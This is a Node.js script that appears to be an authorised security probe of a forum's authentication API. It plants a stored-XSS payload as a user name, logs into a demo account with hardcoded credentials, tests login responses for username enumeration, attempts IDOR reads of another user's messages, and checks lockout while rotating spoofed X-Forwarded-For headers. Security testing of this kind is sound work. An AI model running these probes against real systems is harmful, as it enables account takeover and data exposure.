
const https = require('https');
const agent = new https.Agent({ keepAlive: true, maxSockets: 4 });
const BASE = { host: '127.0.0.1', port: 443, servername: 'seekbbs.cn', rejectUnauthorized: false, agent };
function req(path, { method = 'GET', body, cookie, xff, ua } = {}) {
  return new Promise((res) => {
    const headers = { Host: 'seekbbs.cn', 'User-Agent': ua || 'curl/8.22.0' };
    if (body) { headers['Content-Type'] = 'application/json'; headers['Content-Length'] = Buffer.byteLength(body); }
    if (cookie) headers['Cookie'] = cookie;
    if (xff) headers['X-Forwarded-For'] = xff;
    const r = https.request({ ...BASE, path, method, headers }, (resp) => {
      let d = ''; resp.on('data', c => d += c); resp.on('end', () => res({ code: resp.statusCode, ct: resp.headers['content-type'], sc: resp.headers['set-cookie'], body: d }));
    });
    r.on('error', e => res({ code: 0, err: e.code }));
    if (body) r.write(body); r.end();
  });
}
const sleep = ms => new Promise(r => setTimeout(r, ms));
const J = s => { try { return JSON.parse(s); } catch { return null; } };
function line(tag, x, extra = '') {
  const j = J(x.body);
  const err = j && j.error ? j.error.code + '|' + (j.error.message || '') : (j ? 'ok' : (x.body || '').replace(/\s+/g, ' ').slice(0, 60));
  console.log(tag.padEnd(30), 'HTTP=' + x.code, (x.ct || '').split(';')[0].padEnd(16), err.slice(0, 90), extra);
  if (x.sc) console.log('   Set-Cookie: ' + x.sc.join(' ;; '));
}
const rnd = 'q' + Date.now().toString(36).slice(-5);
const MY = 'demoqa.' + rnd + '@jingyu.local';
const PW = 'Probe1234!';
(async () => {
  console.log('== T1 register (payload as name) ==');
  let reg = await req('/api/auth/register', { method: 'POST', body: JSON.stringify({ email: MY, password: PW, name: '<svg/onload=alert(1)>' }), xff: '10.0.0.1' });
  line('POST /api/auth/register', reg);
  const rj = J(reg.body);
  console.log('   body:', (reg.body || '').slice(0, 320));
  const myCookie = reg.sc ? reg.sc[0].split(';')[0] : '';
  const myId = rj && rj.data && rj.data.user ? rj.data.user.id : null;
  console.log('   my id=' + myId, 'cookie=' + myCookie.slice(0, 30) + '…');
  await sleep(600);

  console.log('== T2 stored-XSS echo check ==');
  const me = await req('/api/auth/me', { cookie: myCookie, xff: '10.0.0.1' });
  line('GET /api/auth/me', me);
  console.log('   raw body:', (me.body || '').slice(0, 400));

  const feed = await req('/api/feed?limit=3', { xff: '10.0.0.1' });
  console.log('   /api/feed has my name?', (feed.body || '').includes('onload=alert'), 'len=' + (feed.body || '').length);

  console.log('== T3 login demo1 (takeover) + cookie flags ==');
  await sleep(6000);
  const dl = await req('/api/auth/login', { method: 'POST', body: JSON.stringify({ email: 'demo1@jingyu.local', password: 'jingyu1234', takeover: true }), xff: '10.0.0.2' });
  line('POST /api/auth/login demo1', dl);
  console.log('   body:', (dl.body || '').slice(0, 260));
  const demoCookie = dl.sc ? dl.sc[0].split(';')[0] : '';
  const dj = J(dl.body);
  const demoId = dj && dj.data && dj.data.user ? dj.data.user.id : null;
  console.log('   demo id=' + demoId);

  console.log('== T4 enumeration oracle ==');
  await sleep(6000);
  const e1 = await req('/api/auth/login', { method: 'POST', body: JSON.stringify({ email: 'nouser.' + rnd + '@jingyu.local', password: 'whatever1' }), xff: '10.0.0.3' });
  line('login unknown email', e1);
  await sleep(6000);
  const e2 = await req('/api/auth/login', { method: 'POST', body: JSON.stringify({ email: 'demo2@jingyu.local', password: 'wrongpass1' }), xff: '10.0.0.4' });
  line('login known email bad pw', e2);

  console.log('== T5 IDOR (read-only, my token -> other user resources) ==');
  if (myCookie && demoId) {
    const m1 = await req('/api/messages/' + demoId, { cookie: myCookie, xff: '10.0.0.1' });
    line('GET /api/messages/' + demoId + ' (other)', m1);
    console.log('   body:', (m1.body || '').slice(0, 200));
    const m2 = await req('/api/messages/' + myId, { cookie: myCookie, xff: '10.0.0.1' });
    line('GET /api/messages/' + myId + ' (self)', m2);
    const s1 = await req('/api/auth/sessions', { cookie: myCookie, xff: '10.0.0.1' });
    line('GET /api/auth/sessions', s1);
  }

  console.log('== T6 lockout on my own account (8 fails) ==');
  const codes = [];
  for (let i = 1; i <= 9; i++) {
    await sleep(6000);
    const w = await req('/api/auth/login', { method: 'POST', body: JSON.stringify({ email: MY, password: 'wrongpw' + i }), xff: '10.0.1.' + i });
    const j = J(w.body);
    codes.push(w.code + '/' + (j && j.error ? j.error.code : '?'));
    const extra = j && j.error && j.error.details ? JSON.stringify(j.error.details) : '';
    line('fail#' + i, w, extra);
  }
  console.log('   sequence:', codes.join(' '));
  await sleep(6000);
  const corr = await req('/api/auth/login', { method: 'POST', body: JSON.stringify({ email: MY, password: PW }), xff: '10.0.2.1' });
  line('correct pw while locked', corr);
  console.log('   body:', (corr.body || '').slice(0, 240));
  agent.destroy();
})();
